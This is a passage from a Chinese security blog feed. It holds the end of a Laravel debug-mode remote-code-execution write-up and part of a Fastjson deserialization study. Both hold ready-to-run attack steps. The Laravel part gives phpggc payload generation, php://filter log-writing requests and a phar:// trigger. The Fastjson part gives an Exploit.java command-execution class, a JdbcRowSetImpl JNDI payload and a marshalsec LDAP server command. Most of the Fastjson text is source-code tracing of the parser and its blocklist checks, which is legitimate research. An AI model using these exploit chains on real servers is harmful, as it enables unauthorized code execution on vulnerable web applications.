(&quot;utf16le&quot;=&gt;&quot;utf-8&quot;): invalid multibyte sequence</code></li></ol><p>解决方案：</p><ol><li>因为日志文件部分内容可控，我们可以把前面的内容刚好填充到<code>2*n bytes</code></li><li>可以用同一种方法，也可以选择把payload复写两次</li></ol><p><strong>写入0字节</strong></p><p>最后一个问题就是我们无法向日志写入<code>\0</code>字节，这时候我们又可以用到一个转换过滤器<code>convert.quoted-printable-decode</code></p><blockquote><p><strong>官方说明</strong></p><pre><code class="c">quoted_printable_decode ( string $str ) : string</code></pre><p>该函数返回 quoted-printable 解码之后的 8-bit 字符串 (参考 <a href="http://www.faqs.org/rfcs/rfc2045">» RFC2045</a> 的6.7章节，而不是 <a href="http://www.faqs.org/rfcs/rfc2821">» RFC2821</a> 的4.5.2章节)</p><p><strong>格式</strong></p><p>(General 8bit representation) Any octet, except a CR or LF that is part of a CRLF line break of the canonical (standard) form of the data being encoded, may be represented by an “=” followed by a two digit hexadecimal representation of the octet’s value.  The digits of the hexadecimal alphabet, for this purpose, are “0123456789ABCDEF”.  Uppercase letters must be used; lowercase letters are not allowed.  Thus, for example, the decimal value 12 (US-ASCII form feed) can be represented by “=0C”, and the decimal value 61 (US- ASCII EQUAL SIGN) can be represented by “=3D”.  This rule must be followed except when the following rules allow an alternative encoding.</p></blockquote><p>简单来说就是将格式为<code>&quot;=&lt;hex&gt;&quot;</code>的字符串转发为对应ascii的字符串，所以我们可以将空字节编码为<code>&quot;=00&quot;</code>传入</p><p>所以最终我们写入payload方法为</p><pre><code>php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log</code></pre><p><strong>生成payload</strong></p><p>payload的生成我们可以反序列化工具<code>phpggc</code></p><blockquote><p><a href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a></p></blockquote><pre><code class="shell">php -d &#39;phar.readonly=0&#39; ./phpggc monolog/rce1 system id --phar phar -o php://output | base64 -w0 | sed -E &#39;s/=+$//g&#39; | sed -E &#39;s/./\0=00/g&#39;</code></pre><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><pre><code class="shell"># 使用phpggc创建payload，注意这里最后添加了一个&#39;=00&#39;，用来屏蔽第二处payload回显php -d &#39;phar.readonly=0&#39; ./phpggc monolog/rce1 system id --phar phar -o php://output | base64 -w0 | python -c &quot;import sys;print(&#39;&#39;.join([&#39;=&#39; + hex(ord(i))[2:].zfill(2) + &#39;=00&#39; for i in sys.stdin.read()]).upper() + &#39;=00&#39;)&quot;# 清空log文件viewFile: php://filter/read=consumed/resource=../storage/logs/laravel.log# 传入字符使文本对齐，这里可传入任意文本viewFile: tyao# 传入payloadviewFile: =50=00=44=00=39=00=77=00=61=00=48=00...# 解码payloadviewFile: php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log# phar反序列化viewFile: phar://../storage/logs/laravel.log</code></pre><h2 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h2><ol><li><p>如果传入的是形如<code>P=00D=009=00w=00...</code>的payload，倒数第二部有可能会产生<code>quoted-printable-decode</code>解码错误，原因如下，有一处省略的地方出现了<code>&quot;=0.&quot;</code>字符串导致解码失败，解决方法是将首字符<code>&#39;P&#39;</code>也进行编码就可以对齐了，懒人方法就是将所有字符进行编码 : &gt;</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105281052e3a43478f71ec9e13073.png" alt="image-20210528024447449"></p></li><li><p>windows下复现失败了，因为是只要在base64的payload中存在<code>&#39;=&#39;</code>时，使用<code>convert.base64-decode</code>过滤器会报错返回空</p></li><li><p>针对第二种情况，我们将payload的命令进行填充至无<code>&#39;=&#39;</code>出现，但是phar协议反序列化时会报phar文件签名错误，大概率是因为<code>phpggc</code>只能在Linux下使用</p><pre><code>failed to open stream: phar &amp;quot;xxxx\\laravel\\storage\\logs\\laravel.log&amp;quot; has a broken signature&quot;</code></pre></li><li><p>如果想要在windows复现估计得重新写一个序列化，为了不麻烦自己，还是在跑去虚拟机复现成功了</p></li></ol><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021052811469e4b69a8d859b25c0a80.png" alt="image-20210528114607301" style="zoom:67%;" /><ol start="5"><li>失败的建议多打几次</li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/351363561">https://zhuanlan.zhihu.com/p/351363561</a></p><p><a href="https://anquan.baidu.com/article/1286">https://anquan.baidu.com/article/1286</a></p><p><a href="https://www.ambionics.io/blog/laravel-debug-rce">https://www.ambionics.io/blog/laravel-debug-rce</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞研究 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson反序列化漏洞研究</title>
      <link href="/2021/05/25/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
      <url>/2021/05/25/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/</url>
      
        <content type="html"><![CDATA[<blockquote><p>研究Fastjson各版本系列反序列化漏洞</p></blockquote><span id="more"></span><blockquote><p>源码：<a href="https://github.com/alibaba/fastjson/wiki/Quick-Start-CN">https://github.com/alibaba/fastjson/wiki/Quick-Start-CN</a></p></blockquote><h2 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h2><p>推荐在maven中配置，在pom.xml中添加 </p><pre><code class="xml">&lt;dependencies&gt;    &lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt;    &lt;dependency&gt;        &lt;groupId&gt;com.alibaba&lt;/groupId&gt;        &lt;artifactId&gt;fastjson&lt;/artifactId&gt;        &lt;version&gt;1.2.24&lt;/version&gt;    &lt;/dependency&gt;&lt;/dependencies&gt;</code></pre><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>fastjson通过parse、parseObject处理以json结构传入的类的字符串形时，会默认调用该类的共有setter与构造函数，并在合适的触发条件下调用该类的getter方法</p><p>当传入的类中setter、getter方法中存在利用点时，攻击者就可以通过传入可控的类的成员变量进行攻击利用</p><p>在1.2.25之后的版本中，fastjson默认关闭了反序列化任意类的操作，即<a href="https://github.com/alibaba/fastjson/wiki/enable_autotype">AutoType</a>，对应的是json字符串中<code>&quot;@type&quot;</code>对应的值</p><p>JNDI注入可以利用RMI或者LDAP服务，高版本的jdk会限制这两个服务的开启，它们可利用的jdk版本如下：</p><ul><li>基于RMI的利用方式，适用jdk版本：<code>6u132</code>、<code>7u122</code>、 <code>8u113</code>之前</li><li>基于LDAP的利用方式，适用jdk版本：<code>6u211</code>、<code>7u201</code>、<code>8u191</code>、<code>11.0.1</code>之前</li></ul><h3 id="反序列化操作"><a href="#反序列化操作" class="headerlink" title="反序列化操作"></a>反序列化操作</h3><p><strong>序列化</strong></p><pre><code class="java">String text = JSON.toJSONString(obj); </code></pre><p><strong>反序列化</strong></p><pre><code class="java">// parse()会识别并调用目标类的setter方法及某些特定条件的getter方法TestClass obj = JSON.parse(&quot;&#123;json_str&#125;&quot;); // 返回JSONObject或JSONArray// parseObject() 等价于 parseObject() =&gt; JSON.toJSON(obj)// parseObject()会调用反序列化目标类的所有setter和getter方法TestClass obj = JSON.parseObject(&quot;&#123;json_str&#125;&quot;); // 只能返回JSONObjectTestClass obj = JSON.parseObject(&quot;&#123;json_str&#125;&quot;, TestClass.class); // 返回TestClass类对象</code></pre><h3 id="反序列化流程图"><a href="#反序列化流程图" class="headerlink" title="反序列化流程图"></a>反序列化流程图</h3><p>核心在于语法解析器</p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105232211af82d694dfca10657691.png" alt="image-20210523011132183" style="zoom:80%;" /><h3 id="反序列化调用流程"><a href="#反序列化调用流程" class="headerlink" title="反序列化调用流程"></a>反序列化调用流程</h3><p>这里我把<code>parse()</code>函数作为例子，探究一下json字符串从反序列化开始后到对应属性的<code>set</code>方法的函数调用过程</p><pre><code class="java">public abstract class JSON implements JSONStreamAware, JSONAware &#123;    public static Object parse(String text) &#123;        return parse(text, DEFAULT_PARSER_FEATURE); // 首先使用默认的feature进行反序列化    &#125;    public static Object parse(String text, int features) &#123;        if (text == null) &#123;            return null;        &#125; else &#123;            DefaultJSONParser parser = new DefaultJSONParser(text, ParserConfig.getGlobalInstance(), features); // 获取默认配置后调用DefaultJSONParser()获取一个DefaultJSONParser            Object value = parser.parse();            parser.handleResovleTask(value);            parser.close();            return value;        &#125;    &#125;</code></pre><p><code>ParserConfig.getGlobalInstance()</code>返回的是配置的全局变量</p><pre><code class="java">public class ParserConfig &#123;    public static ParserConfig getGlobalInstance() &#123;        return global; // 配置的全局变量    &#125;</code></pre><p>紧接着调用<code>DefaultJSONParser()</code>函数返回一个Lexer，就是一个语法解析器</p><pre><code class="java">public class DefaultJSONParser implements Closeable &#123;    public DefaultJSONParser(String input, ParserConfig config, int features) &#123;        this(input, new JSONScanner(input, features), config); // 初始化一个JSONLexer    &#125;    public DefaultJSONParser(Object input, JSONLexer lexer, ParserConfig config) &#123;        this.dateFormatPattern = JSON.DEFFAULT_DATE_FORMAT;        this.contextArrayIndex = 0;        this.resolveStatus = 0;        this.extraTypeProviders = null;        this.extraProcessors = null;        this.fieldTypeResolver = null;        this.lexer = lexer;        this.input = input;        this.config = config;        this.symbolTable = config.symbolTable;        int ch = lexer.getCurrent(); // 使用JSONLexer标记字符串中的&#39;&#123;&#39;和&#39;[&#39;        if (ch == &#39;&#123;&#39;) &#123;            lexer.next();            ((JSONLexerBase)lexer).token = 12;        &#125; else if (ch == &#39;[&#39;) &#123;            lexer.next();            ((JSONLexerBase)lexer).token = 14;        &#125; else &#123;            lexer.nextToken();        &#125;    &#125;</code></pre><p>其中<code>JSONScanner()</code>函数是用来获取BOM信息的</p><pre><code class="java">public final class JSONScanner extends JSONLexerBase &#123;    public JSONScanner(String input, int features) &#123;        super(features);        this.text = input;        this.len = this.text.length();        this.bp = -1;        this.next(); // 读字符串的BOM        if (this.ch == &#39;\ufeff&#39;) &#123;            this.next();        &#125;    &#125;</code></pre><p>获取完Lexer之后我们就进入到<code>parser.parse()</code>函数</p><pre><code class="java">public class DefaultJSONParser implements Closeable &#123;    public Object parse() &#123;        return this.parse((Object)null);    &#125;    public Object parse(Object fieldName) &#123;        JSONLexer lexer = this.lexer;        switch(lexer.token()) &#123; // 根据token        case 1:        case 5:        case 10:        case 11:        case 13:        case 15:        case 16:        case 17:        case 18:        case 19:        default:            throw new JSONException(&quot;syntax error, &quot; + lexer.info());        case 2:            Number intValue = lexer.integerValue();            lexer.nextToken();            return intValue;        case 3:            Object value = lexer.decimalValue(lexer.isEnabled(Feature.UseBigDecimal));            lexer.nextToken();            return value;        case 4:            String stringLiteral = lexer.stringVal();            lexer.nextToken(16);            if (lexer.isEnabled(Feature.AllowISO8601DateFormat)) &#123;                JSONScanner iso8601Lexer = new JSONScanner(stringLiteral);                try &#123;                    if (iso8601Lexer.scanISO8601DateIfMatch()) &#123;                        Date var11 = iso8601Lexer.getCalendar().getTime();                        return var11;                    &#125;                &#125; finally &#123;                    iso8601Lexer.close();                &#125;            &#125;            return stringLiteral;        case 6:            lexer.nextToken();            return Boolean.TRUE;        case 7:            lexer.nextToken();            return Boolean.FALSE;        case 8:            lexer.nextToken();            return null;        case 9:            lexer.nextToken(18);            if (lexer.token() != 18) &#123;                throw new JSONException(&quot;syntax error&quot;);            &#125;            lexer.nextToken(10);            this.accept(10);            long time = lexer.integerValue().longValue();            this.accept(2);            this.accept(11);            return new Date(time);        case 12: // 识别到JsonObject            JSONObject object = new JSONObject(lexer.isEnabled(Feature.OrderedField));            return this.parseObject((Map)object, fieldName);        case 14: // 识别到JsonArray            JSONArray array = new JSONArray();            this.parseArray((Collection)array, (Object)fieldName);            if (lexer.isEnabled(Feature.UseObjectArray)) &#123;                return array.toArray();            &#125;            return array;        case 20:            if (lexer.isBlankInput()) &#123;                return null;            &#125;            throw new JSONException(&quot;unterminated json string, &quot; + lexer.info());        case 21:            lexer.nextToken();            HashSet&lt;Object&gt; set = new HashSet();            this.parseArray((Collection)set, (Object)fieldName);            return set;        case 22:            lexer.nextToken();            TreeSet&lt;Object&gt; treeSet = new TreeSet();            this.parseArray((Collection)treeSet, (Object)fieldName);            return treeSet;        case 23:            lexer.nextToken();            return null;        &#125;    &#125;</code></pre><p>跟进<code>JSONObject()</code>函数设置map</p><pre><code class="java">public class JSONObject extends JSON implements Map&lt;String, Object&gt;, Cloneable, Serializable, InvocationHandler &#123;    public JSONObject(int initialCapacity, boolean ordered) &#123;        if (ordered) &#123; // 根据ordered特征选择HashMap            this.map = new LinkedHashMap(initialCapacity);        &#125; else &#123;            this.map = new HashMap(initialCapacity);        &#125;    &#125;</code></pre><p>下一步到调用最核心的<code>this.parseObject()</code>函数，整个函数都是在用Lexer提取出字符串中的键值和对应值，因为这个函数比较长，所以就不具体展示了，我们重点看判断<code>@type</code>字段的代码</p><blockquote><p>这里简单提一下lexer的相关操作，因为代码太长就不详细列出了：</p><pre><code class="java">lexer.scanSymbol(this.symbolTable, &#39;&quot;&#39;); // 用来提取双引号包括的内容lexer.nextToken(16); // 转移到expect为16的case分支，根据当前的字符设置新的token，如果没有找到就会调用this.nextToken();lexer.nextToken(); // 根据当前的字符设置token</code></pre></blockquote><pre><code class="java">public class DefaultJSONParser implements Closeable &#123;    public final Object parseObject(Map object, Object fieldName) &#123;        ...        if (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123; // JSON.DEFAULT_TYPE_KEY的值为@type            ref = lexer.scanSymbol(this.symbolTable, &#39;&quot;&#39;); // 获取@type对应的类名            Class&lt;?&gt; clazz = TypeUtils.loadClass(ref, this.config.getDefaultClassLoader()); // 使用loadCLass()加载对应类            if (clazz != null) &#123;                lexer.nextToken(16);                if (lexer.token() == 13) &#123;                    lexer.nextToken(16);                    try &#123;                        instance = null;                        ObjectDeserializer deserializer = this.config.getDeserializer(clazz);                        if (deserializer instanceof JavaBeanDeserializer) &#123;                            instance = ((JavaBeanDeserializer)deserializer).createInstance(this, clazz);                        &#125;                        if (instance == null) &#123;                            if (clazz == Cloneable.class) &#123;                                instance = new HashMap();                            &#125; else if (&quot;java.util.Collections$EmptyMap&quot;.equals(ref)) &#123;                                instance = Collections.emptyMap();                            &#125; else &#123;                                instance = clazz.newInstance();                            &#125;                        &#125;                        obj = instance;                        return obj;                    &#125; catch (Exception var23) &#123;                        throw new JSONException(&quot;create instance error&quot;, var23);                    &#125;                &#125;                this.setResolveStatus(2);                if (this.context != null &amp;&amp; !(fieldName instanceof Integer)) &#123;                    this.popContext();                &#125;                if (object.size() &gt; 0) &#123;                    instance = TypeUtils.cast(object, clazz, this.config);                    this.parseObject(instance);                    thisObj = instance;                    return thisObj;                &#125;                ObjectDeserializer deserializer = this.config.getDeserializer(clazz); // 获取反序列化解析器                thisObj = deserializer.deserialze(this, clazz, fieldName); // 进行反序列化                return thisObj;            &#125;            object.put(JSON.DEFAULT_TYPE_KEY, ref);        &#125;        ...</code></pre><p>跟进<code>TypeUtils.loadClass()</code>函数，创建ClassLoader返回了对应类</p><pre><code class="java">public class TypeUtils &#123;    public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;        if (className != null &amp;&amp; className.length() != 0) &#123;            Class&lt;?&gt; clazz = (Class)mappings.get(className); // 获取类名            if (clazz != null) &#123;                return clazz;            &#125; else if (className.charAt(0) == &#39;[&#39;) &#123; // 去掉&#39;[&#39;                Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader);                return Array.newInstance(componentType, 0).getClass();            &#125; else if (className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;)) &#123; // 去掉前面的&#39;L&#39;和后面&#39;;&#39;                String newClassName = className.substring(1, className.length() - 1);                return loadClass(newClassName, classLoader);            &#125; else &#123;                try &#123;                    if (classLoader != null) &#123; // 检查是否已有指定的classLoader                        clazz = classLoader.loadClass(className);                        mappings.put(className, clazz);                        return clazz;                    &#125;                &#125; catch (Throwable var6) &#123;                    var6.printStackTrace();                &#125;                try &#123;                    ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader(); // 从当前线程创建classLoader                    if (contextClassLoader != null) &#123;                        clazz = contextClassLoader.loadClass(className);                        mappings.put(className, clazz);                        return clazz;                    &#125;                &#125; catch (Throwable var5) &#123;                &#125;                try &#123;                    clazz = Class.forName(className);                    mappings.put(className, clazz);                    return clazz;                &#125; catch (Throwable var4) &#123;                    return clazz;                &#125;            &#125;        &#125; else &#123;            return null;        &#125;    &#125;</code></pre><p>下一步进入到<code>getDeserializer()</code>函数，获取对应的反序列化器，这里返回的是<code>JavaBeanDeserializer</code></p><pre><code class="java">public class ParserConfig &#123;    public ObjectDeserializer getDeserializer(Type type) &#123;        ObjectDeserializer derializer = (ObjectDeserializer)this.derializers.get(type);        if (derializer != null) &#123;            return derializer;        &#125; else if (type instanceof Class) &#123;            return this.getDeserializer((Class)type, type);        &#125; else if (type instanceof ParameterizedType) &#123;            Type rawType = ((ParameterizedType)type).getRawType();            return rawType instanceof Class ? this.getDeserializer((Class)rawType, type) : this.getDeserializer(rawType);        &#125; else &#123;            return JavaObjectDeserializer.instance;        &#125;    &#125;    public ObjectDeserializer getDeserializer(Class&lt;?&gt; clazz, Type type) &#123;        ...            for(int i = 0; i &lt; this.denyList.length; ++i) &#123; // 在中间的某一步会检查类名是否处在黑名单中，在1.2.24版本之前，denyList为[&quot;java.lang.Thread&quot;]                String deny = this.denyList[i];                if (className.startsWith(deny)) &#123;                    throw new JSONException(&quot;parser deny : &quot; + className);                &#125;            &#125;        ...</code></pre><p>获取完对应的反序列化器后进可以进行反序列化了，跟进<code>deserialze()</code>函数</p><pre><code class="java">public class JavaBeanDeserializer implements ObjectDeserializer &#123;    public &lt;T&gt; T deserialze(DefaultJSONParser parser, Type type, Object fieldName) &#123;        return this.deserialze(parser, type, fieldName, 0);    &#125;</code></pre><p>上面一步会创建该类的实例<code>instance</code>然后传入到内部的<code>parseRest()</code>函数，进到更具体的<code>deserialze()</code>函数</p><pre><code class="java">public class JavaBeanDeserializer implements ObjectDeserializer &#123;    protected Object parseRest(DefaultJSONParser parser, Type type, Object fieldName, Object instance, int features) &#123;        Object value = this.deserialze(parser, type, fieldName, instance, features);        return value;    &#125;</code></pre><p>这一步的<code>deserialze()</code>函数因为太多也不具体展示了，主要是处理其对象成员，然后调用其<code>set</code>函数来给实例进行赋值，主要代码如下</p><pre><code class="java">public class JavaBeanDeserializer implements ObjectDeserializer &#123;    protected &lt;T&gt; T deserialze(DefaultJSONParser parser, Type type, Object fieldName, Object object, int features) &#123;        ...        if (matchField) &#123; // 是否匹配到对象成员            if (!valueParsed) &#123;                fieldDeser.parseField(parser, object, type, fieldValues);            &#125; else &#123;                if (object == null) &#123;                    fieldValues.put(fieldInfo.name, fieldValue);                &#125; else if (fieldValue == null) &#123;                    if (fieldClass != Integer.TYPE &amp;&amp; fieldClass != Long.TYPE &amp;&amp; fieldClass != Float.TYPE &amp;&amp; fieldClass != Double.TYPE &amp;&amp; fieldClass != Boolean.TYPE) &#123;                        fieldDeser.setValue(object, fieldValue);                    &#125;                &#125; else &#123;                    fieldDeser.setValue(object, fieldValue); // 调用setValue()函数进行赋值                &#125;        ...</code></pre><p>跟一下<code>setValue()</code>函数可以看到使用了<code>invoke()</code>调用了对应的<code>set</code>函数，发现<code>this.fieldInfo.method</code>其实在创建反序列化器的时候就已经被创建，所以我们移步回这个<code>this.config.getDeserializer(clazz)</code>函数的实现</p><pre><code class="java">public abstract class FieldDeserializer &#123;    public void setValue(Object object, Object value) &#123;        if (value != null || !this.fieldInfo.fieldClass.isPrimitive()) &#123;            try &#123;                Method method = this.fieldInfo.method; // 获取对应的set函数                if (method != null) &#123;                    if (this.fieldInfo.getOnly) &#123;                        if (this.fieldInfo.fieldClass == AtomicInteger.class) &#123;                            AtomicInteger atomic = (AtomicInteger)method.invoke(object);                            if (atomic != null) &#123;                                atomic.set(((AtomicInteger)value).get());                            &#125;                        &#125; else if (this.fieldInfo.fieldClass == AtomicLong.class) &#123;                            AtomicLong atomic = (AtomicLong)method.invoke(object);                            if (atomic != null) &#123;                                atomic.set(((AtomicLong)value).get());                            &#125;                        &#125; else if (this.fieldInfo.fieldClass == AtomicBoolean.class) &#123;                            AtomicBoolean atomic = (AtomicBoolean)method.invoke(object);                            if (atomic != null) &#123;                                atomic.set(((AtomicBoolean)value).get());                            &#125;                        &#125; else if (Map.class.isAssignableFrom(method.getReturnType())) &#123;                            Map map = (Map)method.invoke(object);                            if (map != null) &#123;                                map.putAll((Map)value);                            &#125;                        &#125; else &#123;                            Collection collection = (Collection)method.invoke(object);                            if (collection != null) &#123;                                collection.addAll((Collection)value);                            &#125;                        &#125;                    &#125; else &#123;                        method.invoke(object, value); // 使用invoke()调用该set函数                    &#125;                &#125;</code></pre><p>一直跟进到下面这行代码，我们需要创建一个<code>JavaBeanDeserializer</code>的反序列化器</p><pre><code class="java">public class ParserConfig &#123;    public ObjectDeserializer getDeserializer(Class&lt;?&gt; clazz, Type type) &#123;        ...        derializer = this.createJavaBeanDeserializer(clazz, (Type)type);        ...</code></pre><p>在<code>createJavaBeanDeserializer()</code>中对传入的类建立一个<code>beanInfo</code>，这个<code>beanInfo</code>包含了一个类的全部重要属性</p><pre><code class="java">public class ParserConfig &#123;    public ObjectDeserializer createJavaBeanDeserializer(Class&lt;?&gt; clazz, Type type) &#123;        ...        beanInfo = JavaBeanInfo.build(clazz, type, this.propertyNamingStrategy);        ...</code></pre><p>跟进<code>JavaBeanInfo.build()</code>函数的具体实现</p><pre><code class="java">public class JavaBeanInfo &#123;    public static JavaBeanInfo build(Class&lt;?&gt; clazz, Type type, PropertyNamingStrategy propertyNamingStrategy) &#123;        ...        Method[] methods = clazz.getMethods(); // 获取该类的全部方法        ...        if (methodName.startsWith(&quot;set&quot;)) &#123; // 比例类的所有方法，如果找到了以&quot;set&quot;开头的方法            char c3 = methodName.charAt(3);            String propertyName;            if (!Character.isUpperCase(c3) &amp;&amp; c3 &lt;= 512) &#123;                if (c3 == &#39;_&#39;) &#123;                    propertyName = methodName.substring(4);                &#125; else if (c3 == &#39;f&#39;) &#123;                    propertyName = methodName.substring(3);                &#125; else &#123;                    if (methodName.length() &lt; 5 || !Character.isUpperCase(methodName.charAt(4))) &#123;                        continue;                    &#125;                    propertyName = TypeUtils.decapitalize(methodName.substring(3));                &#125;            &#125; else if (TypeUtils.compatibleWithJavaBean) &#123;                propertyName = TypeUtils.decapitalize(methodName.substring(3));            &#125; else &#123;                propertyName = Character.toLowerCase(methodName.charAt(3)) + methodName.substring(4); // 截取&quot;set&quot;之后的字符串并让首字母转为小写，即获取其属性名            &#125;            Field field = TypeUtils.getField(clazz, propertyName, declaredFields);            if (field == null &amp;&amp; types[0] == Boolean.TYPE) &#123; // 如果该属性不在声明成员中且为bool类型时                isFieldName = &quot;is&quot; + Character.toUpperCase(propertyName.charAt(0)) + propertyName.substring(1); // 转化为对应的&quot;is&quot;方法                field = TypeUtils.getField(clazz, isFieldName, declaredFields); // 检查其是否存在&quot;is&quot;方法            &#125;            JSONField fieldAnnotation = null;            if (field != null) &#123;                fieldAnnotation = (JSONField)field.getAnnotation(JSONField.class);                if (fieldAnnotation != null) &#123;                    if (!fieldAnnotation.deserialize()) &#123;                        continue;                    &#125;                    ordinal = fieldAnnotation.ordinal();                    serialzeFeatures = SerializerFeature.of(fieldAnnotation.serialzeFeatures());                    parserFeatures = Feature.of(fieldAnnotation.parseFeatures());                    if (fieldAnnotation.name().length() != 0) &#123;                        propertyName = fieldAnnotation.name();                        add(fieldList, new FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, annotation, fieldAnnotation, (String)null)); // 如果存在对应的&quot;set&quot;方法就会加入到域成员列表中                        continue;                    &#125;                &#125;            &#125;            if (propertyNamingStrategy != null) &#123;                propertyName = propertyNamingStrategy.translate(propertyName);            &#125;            add(fieldList, new FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, annotation, fieldAnnotation, (String)null)); // 最后把对应的属性名和&quot;set&quot;方法等相关信息加入到成员列表中        &#125;</code></pre><p>那么关于json字符串从反序列化开始后到对应属性的<code>set</code>方法调用的分析就到此为止</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="1-2-24漏洞"><a href="#1-2-24漏洞" class="headerlink" title="1.2.24漏洞"></a>1.2.24漏洞</h3><p><strong>Exploit.java</strong></p><blockquote><p>务必记得Exploit.java的编译环境要尽量与漏洞触发环境（客户端）相同</p></blockquote><pre><code class="java">public class Exploit &#123;    public Exploit()&#123;        try &#123;            java.lang.Runtime.getRuntime().exec(new String[]&#123;&quot;calc&quot;&#125;);        &#125;        catch(Exception e) &#123;            e.printStackTrace();        &#125;    &#125;    public static void main(String[] argv)&#123;        Exploit e = new Exploit();    &#125;&#125;// javac Explit.java// python -m http.server 8888    </code></pre><p><strong>客户端</strong></p><pre><code class="java">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);String jsonstr = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;;Object obj = JSON.parseObject(jsonstr);System.out.println(obj)</code></pre><p><strong>服务器</strong></p><pre><code class="cmd">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://localhost:8888/#Exploit&quot; 1389</code></pre><p><strong>分析</strong></p><p>反序列化调用<code>setAutoCommit()</code>函数进行赋值，期间会调用<code>connect()</code>函数</p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105240210736d2a3107a8f4a9ac8a.png" alt="image-20210523021746723" style="zoom: 80%;" /><p>跟进<code>connect()</code>函数，如果<code>dataSourceName</code>不为空就会调用<code>lookup()</code>函数造成jndi注入</p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105240210be38ee1879569a57a263.png" alt="image-20210523021713896" style="zoom: 80%;" /><p><strong>Patch</strong></p><p>在<code>parseObject()</code>中引入了<code>checkAutoType()</code>的黑白名单检查</p><pre><code class="java">public class DefaultJSONParser implements Closeable &#123;    public final Object parseObject(Map object, Object fieldName) &#123;        ...        if (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;            typeName = lexer.scanSymbol(this.symbolTable, &#39;&quot;&#39;);            if (!lexer.isEnabled(Feature.IgnoreAutoType)) &#123;                strValue = null;                Class clazz;                if (object != null &amp;&amp; object.getClass().getName().equals(typeName)) &#123;                    clazz = object.getClass();                &#125; else &#123;                    clazz = this.config.checkAutoType(typeName, (Class)null, lexer.getFeatures()); // 检查黑名单                &#125;        ...</code></pre><p><code>checkAutoType()</code>函数的详细代码</p><pre><code class="java">public class ParserConfig &#123;    public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) &#123;        if (typeName == null) &#123;            return null;        &#125; else if (typeName.length() &gt;= 128) &#123; // 限制了小于128的长度            throw new JSONException(&quot;autoType is not support. &quot; + typeName);        &#125; else &#123;            String className = typeName.replace(&#39;$&#39;, &#39;.&#39;);            Class&lt;?&gt; clazz = null;            int mask;            String accept;            if (this.autoTypeSupport || expectClass != null) &#123;                for(mask = 0; mask &lt; this.acceptList.length; ++mask) &#123; // 检查白名单                    accept = this.acceptList[mask];                    if (className.startsWith(accept)) &#123;                        clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false);                        if (clazz != null) &#123;                            return clazz;                        &#125;                    &#125;                &#125;                for(mask = 0; mask &lt; this.denyList.length; ++mask) &#123; // 检查黑名单                    accept = this.denyList[mask];                    if (className.startsWith(accept) &amp;&amp; TypeUtils.getClassFromMapping(typeName) == null) &#123;                        throw new JSONException(&quot;autoType is not support. &quot; + typeName);                    &#125;                &#125;            &#125;            if (clazz == null) &#123;                clazz = TypeUtils.getClassFromMapping(typeName);            &#125;            if (clazz == null) &#123;                clazz = this.deserializers.findClass(typeName);            &#125;            if (clazz != null) &#123;                if (expectClass != null &amp;&amp; clazz != HashMap.class &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123; // 检查类是否在预期类中                    throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());                &#125; else &#123;                    return clazz;                &#125;            &#125; else &#123;                if (!this.autoTypeSupport) &#123;                    for(mask = 0; mask &lt; this.denyList.length; ++mask) &#123;                        accept = this.denyList[mask];                        if (className.startsWith(accept)) &#123;                            throw new JSONException(&quot;autoType is not support. &quot; + typeName);                        &#125;                    &#125;                    for(mask = 0; mask &lt; this.acceptList.length; ++mask) &#123;                        accept = this.acceptList[mask];                        if (className.startsWith(accept)) &#123;                            if (clazz == null) &#123;                                clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false);                            &#125;                            if (expectClass != null 